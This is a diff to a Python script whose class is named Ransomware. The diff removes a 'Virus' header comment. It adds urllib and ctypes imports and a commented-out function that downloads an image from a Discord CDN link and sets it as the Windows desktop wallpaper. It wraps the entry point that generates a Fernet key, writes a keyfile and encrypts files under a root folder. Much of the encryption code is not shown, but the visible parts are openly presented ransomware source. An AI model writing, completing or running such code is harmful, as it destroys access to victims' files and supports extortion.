@@ -1,11 +1,9 @@
-# the initial Virus (?)
-
-# Corware, a simple 128-bit AES decryptor. ~ parad0xxxx
-
 import os
 from os.path import expanduser
 from cryptography.fernet import Fernet
 import base64
+import ctypes
+import urllib.request
 
 class Ransomware:
 
@@ -102,8 +100,19 @@ class Ransomware:
             f.seek(0)
             f.write(data)
 
+"""def change_background(self):
+	# go to URL and download + save image using absolute path
+	imageUrl = 'https://cdn.discordapp.com/attachments/689056108018401300/689363361980350524/iu.png'
+	path = f'{self.sysroot}Desktop/iu.png'
+	urllib.request.urlretrieve(imageUrl, path)
+	SPI_SETDESKWALLPAPER = 20
+	# access windows .dll for functionality
+	ctypes.windll.user32.SystemParameterInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
+	print('hi')""" # // **CHANGED TO A DIFFERENT SCRIPT**
 
-if __name__ == '__main__':
+
+
+def main():
     # sys_root = expanduser('~')
     local_root = '.'
 
@@ -131,3 +140,7 @@ if __name__ == '__main__':
         rware.generate_key()
         rware.write_key('keyfile')
         rware.crypt_root(local_root)
+
+if __name__ == '__main__':
+	main()
+	#change_background(self)
